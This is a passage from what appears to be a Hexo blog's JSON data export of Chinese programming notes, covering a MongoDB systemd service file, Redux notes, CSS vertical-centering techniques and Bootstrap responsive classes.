自启动</a></h2><p>需要学习的命令是 <a href=\"http://www.jinbuguo.com/systemd/systemd.service.html\" target=\"_blank\" rel=\"noopener\">systemctl</a><br>需要知晓的目录是 <code>/usr/lib/systemd/system</code><br>需要掌握 <code>mongodb.service</code> 的书写格式，demo如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=mongodb</span><br><span class=\"line\">After=network.target remote-fs.target nss-lookup.target  </span><br><span class=\"line\">  </span><br><span class=\"line\">[Service]  </span><br><span class=\"line\">Type=forking  </span><br><span class=\"line\">ExecStart=/usr/local/mongodb/bin/mongod --config /home/mongodb/mongodb/bin/mongod.conf</span><br><span class=\"line\">ExecReload=/bin/kill -s HUP $MAINPID</span><br><span class=\"line\">ExecStop=/usr/local/mongodb/bin/mongod --shutdown --config /home/mongodb/mongodb/bin/mongod.conf</span><br><span class=\"line\">PrivateTmp=true  </span><br><span class=\"line\">    </span><br><span class=\"line\">[Install]  </span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></p>\n<p>最初博主在 <code>ExecStart</code> 的写法是:  </p>\n<blockquote>\n<p>/home/mongodb/mongodb/bin/mongod –dbpath=/home/mongodb/mongodb/db –logpath=/home/mongodb/mongodb/logs/<code>date +%Y-%m-%d</code>.log –logappend –auth –fork &amp;</p>\n</blockquote>\n<p>后来参考资料改成：  </p>\n<blockquote>\n<p>/home/mongodb/mongodb/bin/mongod –config /home/mongodb/mongodb/bin/mongod.conf</p>\n</blockquote>\n<hr>\n<h2 id=\"附录：\"><a href=\"#附录：\" class=\"headerlink\" title=\"附录：\"></a><strong>附录：</strong></h2><ol>\n<li><a href=\"https://blog.csdn.net/wangjianno2/article/details/39718681\" target=\"_blank\" rel=\"noopener\">Linux下curl命令的使用</a></li>\n<li><a href=\"https://www.cnblogs.com/duhuo/p/5695256.html\" target=\"_blank\" rel=\"noopener\">Linux curl命令详解</a></li>\n<li><a href=\"https://blog.csdn.net/shuaigexiaobo/article/details/78030008\" target=\"_blank\" rel=\"noopener\">查看CentOS版本信息</a></li>\n</ol>\n"},{"title":"服务器部署","date":"2018-08-06T08:19:33.000Z","_content":"","source":"_posts/server/服务器部署.md","raw":"---\ntitle: 服务器部署\ndate: 2018-08-06 16:19:33\ntags: 服务器部署\ncategories: Server\n---\n","slug":"server/服务器部署","published":1,"updated":"2018-09-05T06:33:18.511Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxx0005jzodvtky5jc5v","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"十一学习记录","date":"2018-10-03T03:29:11.000Z","_content":"# 第一天\n复习昨日下午组长培训内容\n1. 组件中定义两个方法\n    > mapStateToProps // 函数、方法, 把`Redux`状态树`store`对象 中数据 遍历赋值 到 当前挂载组件`props`中\n    > mapDispatchToProps // 派发方法 到 当前挂载组件`props`\n","source":"_posts/日常记录/十一学习记录.md","raw":"---\ntitle: 十一学习记录\ndate: 2018-10-03 11:29:11\ntags: 日记\ncategories: Date\n---\n# 第一天\n复习昨日下午组长培训内容\n1. 组件中定义两个方法\n    > mapStateToProps // 函数、方法, 把`Redux`状态树`store`对象 中数据 遍历赋值 到 当前挂载组件`props`中\n    > mapDispatchToProps // 派发方法 到 当前挂载组件`props`\n","slug":"日常记录/十一学习记录","published":1,"updated":"2018-10-03T04:00:25.699Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxx2005nzodv5yuevnlj","content":"<h1 id=\"第一天\"><a href=\"#第一天\" class=\"headerlink\" title=\"第一天\"></a>第一天</h1><p>复习昨日下午组长培训内容</p>\n<ol>\n<li>组件中定义两个方法<blockquote>\n<p>mapStateToProps // 函数、方法, 把<code>Redux</code>状态树<code>store</code>对象 中数据 遍历赋值 到 当前挂载组件<code>props</code>中<br>mapDispatchToProps // 派发方法 到 当前挂载组件<code>props</code></p>\n</blockquote>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"第一天\"><a href=\"#第一天\" class=\"headerlink\" title=\"第一天\"></a>第一天</h1><p>复习昨日下午组长培训内容</p>\n<ol>\n<li>组件中定义两个方法<blockquote>\n<p>mapStateToProps // 函数、方法, 把<code>Redux</code>状态树<code>store</code>对象 中数据 遍历赋值 到 当前挂载组件<code>props</code>中<br>mapDispatchToProps // 派发方法 到 当前挂载组件<code>props</code></p>\n</blockquote>\n</li>\n</ol>\n"},{"title":"元素垂直居中方法","date":"2018-08-06T08:21:31.000Z","_content":"## 方法一\n\n这个方法把一些 div 的显示方式设置为`表格`，因此我们可以使用表格的 `vertical-align property` 属性。\n\n````\n<div id=\"wrapper\">\n  <div id=\"cell\">\n    <div class=\"content\">Content goes here</div>\n  </div>\n</div>\n\n<style>\n  wrapper {\n    display: table;\n  }\n\n  cell {\n    display: table-cell;\n    vertical-align: middle;\n  }\n</style>\n````\n\n**优点：**\n`content` 可以动态改变高度(不需在 CSS 中定义)。当 wrapper 里没有足够空间时， content 不会被截断\n\n**缺点：**\nInternet Explorer(甚至 IE8 beta)中无效，许多嵌套标签(其实没那么糟糕，另一个专题)\n\n## 方法二\n这个方法使用`绝对定位`的 div，把它的 top 设置为 50％，top margin 设置为负的 content 高度。这意味着对象必须在 CSS 中`指定固定的高度`。\n\n因为有固定高度，或许你想给 `content` 指定 `overflow:auto`，这样如果 content 太多的话，就会出现滚动条，以免content 溢出。\n\n````\n<div class=\"content\"> Content goes here</div>\n\n<style>\n  position: absolute; \n  top: 50%; \n  height: 240px; \n  margin-top: -120px; /* negative half of the height(高度的一半) */\n</style>\n````\n**优点：**\n适用于所有浏览器\n不需要嵌套标签\n\n**缺点：**\n没有足够空间时，content 会消失(类似div 在 body 内，当用户缩小浏览器窗口，滚动条不出现的情况)\n\n## 方法三\n\n这种方法，在 `content` 元素外插入一个 div。设置此 div `height:50%; margin-bottom:-contentheight;`。\ncontent 清除浮动，并显示在中间。\n````\n<div id=\"floater\">\n  <div id=\"content\">Content here</div>\n</div>\n\nfloater {\n  float: left;\n  height: 50%;\n  margin-bottom: -120px;\n}\n\ncontent {\n  clear: both;\n  height: 240px;\n  position: relative;\n}\n````\n**优点：**\n适用于所有浏览器\n没有足够空间时(例如：窗口缩小) content 不会被截断，滚动条出现\n\n**缺点：**\n唯一我能想到的就是需要额外的空元素了(也没那么糟，又是另外一个话题)\n\n## 方法四\n这个方法使用了一个 `position:absolute`，有固定宽度和高度的 div。这个 div 被设置为 top:0; bottom:0;。但是因为它有固定高度，其实并不能和上下都间距为 0，因此 margin:auto; 会使它居中。使用 margin:auto;使块级元素垂直居中是很简单的。\n\n````\n<div id=\"content\"> Content here</div>\n\ncontent {\n  position: absolute;\n  top: 0;\n  bottom: 0;\n  left: 0;\n  right: 0;\n  margin: auto;\n  height: 240px;\n  width: 70%;\n}\n````\n**优点：**\n简单\n\n**缺点：**\n`IE(IE8 beta)`中无效; \n无足够空间时，content 被截断，但是不会有滚动条出现\n\n## 方法五：文本居中\n\n这个方法只能将单行文本置中。只需要简单地把 `line-height` 设置为那个对象的 height 值就可以使文本居中了。\n\n````\n<div id=\"content\"> Content here</div>\n\ncontent {\n  height: 100px;\n  line-height: 100px;\n}\n````\n**优点：**\n适用于所有浏览器\n无足够空间时不会被截断\n\n**缺点：**\n只对文本有效(块级元素无效)\n多行时，断词比较糟糕\n\n\n","source":"_posts/FrontEnd/HTML CSS/CSS-元素垂直居中.md","raw":"---\ntitle: 元素垂直居中方法\ndate: 2018-08-06 16:21:31\ntags: 元素垂直居中\ncategories: CSS\n---\n## 方法一\n\n这个方法把一些 div 的显示方式设置为`表格`，因此我们可以使用表格的 `vertical-align property` 属性。\n\n````\n<div id=\"wrapper\">\n  <div id=\"cell\">\n    <div class=\"content\">Content goes here</div>\n  </div>\n</div>\n\n<style>\n  wrapper {\n    display: table;\n  }\n\n  cell {\n    display: table-cell;\n    vertical-align: middle;\n  }\n</style>\n````\n\n**优点：**\n`content` 可以动态改变高度(不需在 CSS 中定义)。当 wrapper 里没有足够空间时， content 不会被截断\n\n**缺点：**\nInternet Explorer(甚至 IE8 beta)中无效，许多嵌套标签(其实没那么糟糕，另一个专题)\n\n## 方法二\n这个方法使用`绝对定位`的 div，把它的 top 设置为 50％，top margin 设置为负的 content 高度。这意味着对象必须在 CSS 中`指定固定的高度`。\n\n因为有固定高度，或许你想给 `content` 指定 `overflow:auto`，这样如果 content 太多的话，就会出现滚动条，以免content 溢出。\n\n````\n<div class=\"content\"> Content goes here</div>\n\n<style>\n  position: absolute; \n  top: 50%; \n  height: 240px; \n  margin-top: -120px; /* negative half of the height(高度的一半) */\n</style>\n````\n**优点：**\n适用于所有浏览器\n不需要嵌套标签\n\n**缺点：**\n没有足够空间时，content 会消失(类似div 在 body 内，当用户缩小浏览器窗口，滚动条不出现的情况)\n\n## 方法三\n\n这种方法，在 `content` 元素外插入一个 div。设置此 div `height:50%; margin-bottom:-contentheight;`。\ncontent 清除浮动，并显示在中间。\n````\n<div id=\"floater\">\n  <div id=\"content\">Content here</div>\n</div>\n\nfloater {\n  float: left;\n  height: 50%;\n  margin-bottom: -120px;\n}\n\ncontent {\n  clear: both;\n  height: 240px;\n  position: relative;\n}\n````\n**优点：**\n适用于所有浏览器\n没有足够空间时(例如：窗口缩小) content 不会被截断，滚动条出现\n\n**缺点：**\n唯一我能想到的就是需要额外的空元素了(也没那么糟，又是另外一个话题)\n\n## 方法四\n这个方法使用了一个 `position:absolute`，有固定宽度和高度的 div。这个 div 被设置为 top:0; bottom:0;。但是因为它有固定高度，其实并不能和上下都间距为 0，因此 margin:auto; 会使它居中。使用 margin:auto;使块级元素垂直居中是很简单的。\n\n````\n<div id=\"content\"> Content here</div>\n\ncontent {\n  position: absolute;\n  top: 0;\n  bottom: 0;\n  left: 0;\n  right: 0;\n  margin: auto;\n  height: 240px;\n  width: 70%;\n}\n````\n**优点：**\n简单\n\n**缺点：**\n`IE(IE8 beta)`中无效; \n无足够空间时，content 被截断，但是不会有滚动条出现\n\n## 方法五：文本居中\n\n这个方法只能将单行文本置中。只需要简单地把 `line-height` 设置为那个对象的 height 值就可以使文本居中了。\n\n````\n<div id=\"content\"> Content here</div>\n\ncontent {\n  height: 100px;\n  line-height: 100px;\n}\n````\n**优点：**\n适用于所有浏览器\n无足够空间时不会被截断\n\n**缺点：**\n只对文本有效(块级元素无效)\n多行时，断词比较糟糕\n\n\n","slug":"FrontEnd/HTML CSS/CSS-元素垂直居中","published":1,"updated":"2018-11-28T02:39:23.215Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxy5007lzodvmtf0leuy","content":"<h2 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2><p>这个方法把一些 div 的显示方式设置为<code>表格</code>，因此我们可以使用表格的 <code>vertical-align property</code> 属性。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;wrapper&quot;&gt;</span><br><span class=\"line\">  &lt;div id=&quot;cell&quot;&gt;</span><br><span class=\"line\">    &lt;div class=&quot;content&quot;&gt;Content goes here&lt;/div&gt;</span><br><span class=\"line\">  &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">  wrapper &#123;</span><br><span class=\"line\">    display: table;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  cell &#123;</span><br><span class=\"line\">    display: table-cell;</span><br><span class=\"line\">    vertical-align: middle;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>优点：</strong><br><code>content</code> 可以动态改变高度(不需在 CSS 中定义)。当 wrapper 里没有足够空间时， content 不会被截断</p>\n<p><strong>缺点：</strong><br>Internet Explorer(甚至 IE8 beta)中无效，许多嵌套标签(其实没那么糟糕，另一个专题)</p>\n<h2 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2><p>这个方法使用<code>绝对定位</code>的 div，把它的 top 设置为 50％，top margin 设置为负的 content 高度。这意味着对象必须在 CSS 中<code>指定固定的高度</code>。</p>\n<p>因为有固定高度，或许你想给 <code>content</code> 指定 <code>overflow:auto</code>，这样如果 content 太多的话，就会出现滚动条，以免content 溢出。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div class=&quot;content&quot;&gt; Content goes here&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">  position: absolute; </span><br><span class=\"line\">  top: 50%; </span><br><span class=\"line\">  height: 240px; </span><br><span class=\"line\">  margin-top: -120px; /* negative half of the height(高度的一半) */</span><br><span class=\"line\">&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>优点：</strong><br>适用于所有浏览器<br>不需要嵌套标签</p>\n<p><strong>缺点：</strong><br>没有足够空间时，content 会消失(类似div 在 body 内，当用户缩小浏览器窗口，滚动条不出现的情况)</p>\n<h2 id=\"方法三\"><a href=\"#方法三\" class=\"headerlink\" title=\"方法三\"></a>方法三</h2><p>这种方法，在 <code>content</code> 元素外插入一个 div。设置此 div <code>height:50%; margin-bottom:-contentheight;</code>。<br>content 清除浮动，并显示在中间。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;floater&quot;&gt;</span><br><span class=\"line\">  &lt;div id=&quot;content&quot;&gt;Content here&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">floater &#123;</span><br><span class=\"line\">  float: left;</span><br><span class=\"line\">  height: 50%;</span><br><span class=\"line\">  margin-bottom: -120px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">content &#123;</span><br><span class=\"line\">  clear: both;</span><br><span class=\"line\">  height: 240px;</span><br><span class=\"line\">  position: relative;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>优点：</strong><br>适用于所有浏览器<br>没有足够空间时(例如：窗口缩小) content 不会被截断，滚动条出现</p>\n<p><strong>缺点：</strong><br>唯一我能想到的就是需要额外的空元素了(也没那么糟，又是另外一个话题)</p>\n<h2 id=\"方法四\"><a href=\"#方法四\" class=\"headerlink\" title=\"方法四\"></a>方法四</h2><p>这个方法使用了一个 <code>position:absolute</code>，有固定宽度和高度的 div。这个 div 被设置为 top:0; bottom:0;。但是因为它有固定高度，其实并不能和上下都间距为 0，因此 margin:auto; 会使它居中。使用 margin:auto;使块级元素垂直居中是很简单的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;content&quot;&gt; Content here&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">content &#123;</span><br><span class=\"line\">  position: absolute;</span><br><span class=\"line\">  top: 0;</span><br><span class=\"line\">  bottom: 0;</span><br><span class=\"line\">  left: 0;</span><br><span class=\"line\">  right: 0;</span><br><span class=\"line\">  margin: auto;</span><br><span class=\"line\">  height: 240px;</span><br><span class=\"line\">  width: 70%;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>优点：</strong><br>简单</p>\n<p><strong>缺点：</strong><br><code>IE(IE8 beta)</code>中无效;<br>无足够空间时，content 被截断，但是不会有滚动条出现</p>\n<h2 id=\"方法五：文本居中\"><a href=\"#方法五：文本居中\" class=\"headerlink\" title=\"方法五：文本居中\"></a>方法五：文本居中</h2><p>这个方法只能将单行文本置中。只需要简单地把 <code>line-height</code> 设置为那个对象的 height 值就可以使文本居中了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;content&quot;&gt; Content here&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">content &#123;</span><br><span class=\"line\">  height: 100px;</span><br><span class=\"line\">  line-height: 100px;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>优点：</strong><br>适用于所有浏览器<br>无足够空间时不会被截断</p>\n<p><strong>缺点：</strong><br>只对文本有效(块级元素无效)<br>多行时，断词比较糟糕</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2><p>这个方法把一些 div 的显示方式设置为<code>表格</code>，因此我们可以使用表格的 <code>vertical-align property</code> 属性。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;wrapper&quot;&gt;</span><br><span class=\"line\">  &lt;div id=&quot;cell&quot;&gt;</span><br><span class=\"line\">    &lt;div class=&quot;content&quot;&gt;Content goes here&lt;/div&gt;</span><br><span class=\"line\">  &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">  wrapper &#123;</span><br><span class=\"line\">    display: table;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  cell &#123;</span><br><span class=\"line\">    display: table-cell;</span><br><span class=\"line\">    vertical-align: middle;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>优点：</strong><br><code>content</code> 可以动态改变高度(不需在 CSS 中定义)。当 wrapper 里没有足够空间时， content 不会被截断</p>\n<p><strong>缺点：</strong><br>Internet Explorer(甚至 IE8 beta)中无效，许多嵌套标签(其实没那么糟糕，另一个专题)</p>\n<h2 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2><p>这个方法使用<code>绝对定位</code>的 div，把它的 top 设置为 50％，top margin 设置为负的 content 高度。这意味着对象必须在 CSS 中<code>指定固定的高度</code>。</p>\n<p>因为有固定高度，或许你想给 <code>content</code> 指定 <code>overflow:auto</code>，这样如果 content 太多的话，就会出现滚动条，以免content 溢出。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div class=&quot;content&quot;&gt; Content goes here&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">  position: absolute; </span><br><span class=\"line\">  top: 50%; </span><br><span class=\"line\">  height: 240px; </span><br><span class=\"line\">  margin-top: -120px; /* negative half of the height(高度的一半) */</span><br><span class=\"line\">&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>优点：</strong><br>适用于所有浏览器<br>不需要嵌套标签</p>\n<p><strong>缺点：</strong><br>没有足够空间时，content 会消失(类似div 在 body 内，当用户缩小浏览器窗口，滚动条不出现的情况)</p>\n<h2 id=\"方法三\"><a href=\"#方法三\" class=\"headerlink\" title=\"方法三\"></a>方法三</h2><p>这种方法，在 <code>content</code> 元素外插入一个 div。设置此 div <code>height:50%; margin-bottom:-contentheight;</code>。<br>content 清除浮动，并显示在中间。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;floater&quot;&gt;</span><br><span class=\"line\">  &lt;div id=&quot;content&quot;&gt;Content here&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">floater &#123;</span><br><span class=\"line\">  float: left;</span><br><span class=\"line\">  height: 50%;</span><br><span class=\"line\">  margin-bottom: -120px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">content &#123;</span><br><span class=\"line\">  clear: both;</span><br><span class=\"line\">  height: 240px;</span><br><span class=\"line\">  position: relative;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>优点：</strong><br>适用于所有浏览器<br>没有足够空间时(例如：窗口缩小) content 不会被截断，滚动条出现</p>\n<p><strong>缺点：</strong><br>唯一我能想到的就是需要额外的空元素了(也没那么糟，又是另外一个话题)</p>\n<h2 id=\"方法四\"><a href=\"#方法四\" class=\"headerlink\" title=\"方法四\"></a>方法四</h2><p>这个方法使用了一个 <code>position:absolute</code>，有固定宽度和高度的 div。这个 div 被设置为 top:0; bottom:0;。但是因为它有固定高度，其实并不能和上下都间距为 0，因此 margin:auto; 会使它居中。使用 margin:auto;使块级元素垂直居中是很简单的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;content&quot;&gt; Content here&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">content &#123;</span><br><span class=\"line\">  position: absolute;</span><br><span class=\"line\">  top: 0;</span><br><span class=\"line\">  bottom: 0;</span><br><span class=\"line\">  left: 0;</span><br><span class=\"line\">  right: 0;</span><br><span class=\"line\">  margin: auto;</span><br><span class=\"line\">  height: 240px;</span><br><span class=\"line\">  width: 70%;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>优点：</strong><br>简单</p>\n<p><strong>缺点：</strong><br><code>IE(IE8 beta)</code>中无效;<br>无足够空间时，content 被截断，但是不会有滚动条出现</p>\n<h2 id=\"方法五：文本居中\"><a href=\"#方法五：文本居中\" class=\"headerlink\" title=\"方法五：文本居中\"></a>方法五：文本居中</h2><p>这个方法只能将单行文本置中。只需要简单地把 <code>line-height</code> 设置为那个对象的 height 值就可以使文本居中了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;content&quot;&gt; Content here&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">content &#123;</span><br><span class=\"line\">  height: 100px;</span><br><span class=\"line\">  line-height: 100px;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>优点：</strong><br>适用于所有浏览器<br>无足够空间时不会被截断</p>\n<p><strong>缺点：</strong><br>只对文本有效(块级元素无效)<br>多行时，断词比较糟糕</p>\n"},{"title":"Bootstrap响应式布局","date":"2018-05-11T08:24:17.000Z","_content":"## Bootstrap不同分辨率下隐藏元素\n\nhidden-xs hidden-sm 等控制隐藏\nvisible-xs-* visible-sm-* 等控制显示\n\n[说明文档](http://v3.bootcss.com/css/#responsive-utilities)\n\n-----------\n","source":"_posts/FrontEnd/HTML CSS/Bootstrap响应式布局.md","raw":"---\ntitle: Bootstrap响应式布局\ndate: 2018-05-11 16:24:17\ntags: Bootstrap\ncategories: CSS\n---\n## Bootstrap不同分辨率下隐藏元素\n\nhidden-xs hidden-sm 等控制隐藏\nvisible-xs-* visible-sm-* 等控制显示\n\n[说明文档](http://v3.bootcss.com/css/#responsive-utilities)\n\n-----------\n","slug":"FrontEnd/HTML CSS/Bootstrap响应式布局","published":1,"updated":"2018-09-05T06:33:18.445Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxy6007mzodviorx8qxg","content":"<h2 id=\"Bootstrap不同分辨率下隐藏元素\"><a href=\"#Bootstrap不同分辨率下隐藏元素\" class=\"headerlink\" title=\"Bootstrap不同分辨率下隐藏元素\"></a>Bootstrap不同分辨率下隐藏元素</h2><p>hidden-xs hidden-sm 等控制隐藏<br>visible-xs-<em> visible-sm-</em> 等控制显示</p>\n<p><a href=\"http://v3.bootcss.com/css/#responsive-utilities\" target=\"_blank\" rel=\"noopener\">说明文档</a></p>\n<hr>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Bootstrap不同分辨率下隐藏元素\"><a href=\"#Bootstrap不同分辨率下隐藏元素\" class=\"headerlink\" title=\"Bootstrap不同分辨率下隐藏元素\"></a>Bootstrap不同分辨率下隐藏元素</h2><p>hidden-xs hidden-sm 等控制隐藏<br>visible-xs-<em> visible-sm-</em> 等控制显示</p>\n<p><a href=\"http://v3.bootcss.com/css/#responsive-utilities\" target=\"_blank\" rel=\"noopener\">说明文档</a></p>\n<hr>\n"},{"title":"C3 选择器","date":"2019-01-26T07:04:49.000Z","_content":"````\n.item {\n  &:not(.itemCard0)\n}\n````\n\n````\n calc(~\"100% - 19px\")\n````\n","source":"_posts/FrontEnd/HTML CSS/C3-选择器.md","raw":"---\ntitle: C3 选择器\ndate: 2019-01-26 15:04:49\ntags:\ncategories: CSS\n---\n````\n.item {\n  &:not(.itemCard0)\n}\n````\n\n````\n calc(~\"100% - 19px\")\n````\n","slug":"FrontEnd/HTML CSS/C3-选择器","published":1,"updated":"2019-01-26T09:35:57.111Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxy8007ozodvsqbkoxhh","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.item &#123;</span><br><span class=\"line\">  &amp;:not(.itemCard0)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">calc(~&quot;100% - 19px&quot;)</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.item &#123;</span><br><span class=\"line\">  &amp;:not(.itemCard0)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">calc(~&quot;100% - 